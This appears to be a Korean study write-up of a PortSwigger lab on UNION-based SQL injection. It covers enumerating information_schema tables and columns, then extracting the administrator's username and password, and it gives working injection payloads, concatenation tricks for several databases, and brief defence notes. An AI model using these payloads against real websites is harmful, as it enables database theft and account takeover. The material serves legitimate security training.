# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / Information Schema
- **링크**: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
- **참고**:
  - https://portswigger.net/web-security/sql-injection/cheat-sheet
  - https://www.postgresql.org/docs/current/infoschema-tables.html
  - https://www.postgresql.org/docs/current/infoschema-columns.html

## 목표

`information_schema`를 이용해 DB 내 테이블과 컬럼 구조를 파악하고, 계정 정보를 추출하여 `administrator`로 로그인한다.

## 003·004 랩과의 차이점

003, 004 랩은 UNION으로 **이미 알고 있는 시스템 뷰**(`v$version`, `@@version`)에서 데이터를 꺼냈다. 이 랩은 한 단계 더 나아가 **테이블 이름과 컬럼 이름을 모르는 상태에서 스스로 탐색**하는 과정을 다룬다.

| 단계 | 내용 |
|------|------|
| 003·004 | 알려진 시스템 뷰에서 버전 정보 추출 |
| 005 | information_schema → 테이블 탐색 → 컬럼 탐색 → 데이터 추출 → 로그인 |

## 분석

MySQL, PostgreSQL, MSSQL 등 Oracle을 제외한 대부분의 DBMS는 `information_schema`를 제공한다. 이 스키마에는 DB 내 모든 테이블과 컬럼의 메타데이터가 담겨 있어, 구조를 모르는 상태에서도 체계적으로 탐색할 수 있다.

| 뷰 | 역할 |
|----|------|
| `information_schema.tables` | DB 내 모든 테이블 목록 |
| `information_schema.columns` | 각 테이블의 컬럼 목록 및 타입 |

## 풀이

### 1단계 — 컬럼 수 및 타입 파악

003·004와 동일하게 `ORDER BY`와 `UNION SELECT NULL`로 컬럼 수를 확인한다.

```sql
' ORDER BY 2--
' UNION SELECT NULL,NULL--
```

컬럼이 2개이고 둘 다 문자열 출력이 가능함을 확인한다.

### 2단계 — 테이블 목록 조회 (information_schema.tables)

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

응답에서 `pg_` 또는 `sql_` 등 시스템 테이블을 제외하고 사용자 정의 테이블을 찾는다. 계정 정보가 담긴 것으로 추정되는 테이블명을 식별한다. (예: `users_abcdef`)

`table_schema` 조건으로 사용자 테이블만 필터링할 수 있다.

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

> `information_schema.tables`의 주요 컬럼 참고: [PostgreSQL 공식 문서](https://www.postgresql.org/docs/current/infoschema-tables.html)

| 컬럼명 | 설명 |
|--------|------|
| `table_catalog` | DB 이름 |
| `table_schema` | 스키마 이름 (PostgreSQL에서 사용자 테이블은 보통 `public`) |
| `table_name` | 테이블 이름 |
| `table_type` | `BASE TABLE` / `VIEW` 등 |

### 3단계 — 컬럼 목록 조회 (information_schema.columns)

2단계에서 찾은 테이블명(`users_abcdef`)의 컬럼을 조회한다.

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```

응답에서 username, password에 해당하는 컬럼명을 식별한다. (예: `username_xyz`, `password_xyz`)

> `information_schema.columns`의 주요 컬럼 참고: [PostgreSQL 공식 문서](https://www.postgresql.org/docs/current/infoschema-columns.html)

| 컬럼명 | 설명 |
|--------|------|
| `table_name` | 소속 테이블 이름 |
| `column_name` | 컬럼 이름 |
| `data_type` | 데이터 타입 (`character varying`, `integer` 등) |

### 4단계 — 계정 정보 추출

확인한 테이블명과 컬럼명으로 계정 정보를 추출한다.

```sql
' UNION SELECT username_xyz,password_xyz FROM users_abcdef--
```

응답에서 `administrator`의 비밀번호를 확인한다.

### 5단계 — 로그인

추출한 `administrator` 계정과 비밀번호로 로그인한다. (002 랩과 동일한 방식)

## 핵심 정리

- `information_schema`는 DB 구조 전체를 담고 있는 메타데이터 스키마로, SQL injection 탐색의 핵심 경로다.
- `tables` → `columns` → 실제 데이터 순으로 단계적으로 탐색한다.
- Oracle은 `information_schema`를 지원하지 않으므로 `all_tables`, `all_tab_columns` 등 별도 뷰를 사용한다.
- **방어**: Prepared Statement 사용, DB 계정에 `information_schema` 접근 권한 최소화.

## 배운 점 및 추가 학습

### 1. information_schema 탐색 전체 흐름 요약

```
① information_schema.tables   → 테이블 이름 파악
② information_schema.columns  → 컬럼 이름 파악
③ 실제 테이블                  → 데이터 추출
```

### 2. DBMS별 테이블·컬럼 조회 방법 비교

| DBMS | 테이블 목록 | 컬럼 목록 |
|------|-------------|-----------|
| MySQL / PostgreSQL / MSSQL | `information_schema.tables` | `information_schema.columns` |
| Oracle | `all_tables` / `user_tables` | `all_tab_columns` |

Oracle이 `information_schema`를 지원하지 않는다는 점이 이번 랩 제목에 "non-Oracle"이 붙은 이유다.

### 3. 두 컬럼을 하나로 합치는 방법 (컬럼이 1개만 출력될 때)

출력 가능한 컬럼이 1개뿐일 때 username과 password를 한 번에 추출하려면 문자열 연결을 사용한다.

| DBMS | 연결 방법 | 예시 |
|------|-----------|------|
| PostgreSQL | `||` | `username_xyz\|\|'~'\|\|password_xyz` |
| MySQL | `CONCAT()` | `CONCAT(username_xyz,'~',password_xyz)` |
| MSSQL | `+` | `username_xyz+'~'+password_xyz` |
| Oracle | `||` | `username_xyz\|\|'~'\|\|password_xyz` |

구분자(`~`)는 username이나 password에 포함되지 않을 문자를 사용한다.

### 4. table_schema 필터링의 중요성

`information_schema.tables`에는 시스템 테이블이 수백 개 포함되어 있다. 필터링 없이 조회하면 결과가 너무 많아 사용자 테이블을 찾기 어렵다.

```sql
-- PostgreSQL: 사용자 테이블만 필터링
WHERE table_schema = 'public'

-- MySQL: 현재 DB의 테이블만 필터링
WHERE table_schema = database()

-- MSSQL: 사용자 테이블만 필터링
WHERE table_type = 'BASE TABLE'
```

### 5. 추가로 고민해볼 것

- 테이블명과 컬럼명이 난독화(예: `users_abcdef`, `password_xyz`)되어 있어도 `information_schema`로 찾아낼 수 있다. 이름 난독화는 SQL injection 방어 수단이 아니다.
- `information_schema.tables`에서 `table_name LIKE '%user%'`로 키워드 검색을 하면 관심 테이블을 빠르게 좁힐 수 있다.
- 다음 단계는 에러 메시지 없이 데이터를 추출하는 **Blind SQL Injection**이다. 화면에 UNION 결과가 보이지 않아도 동일한 information_schema 탐색 경로를 사용한다.
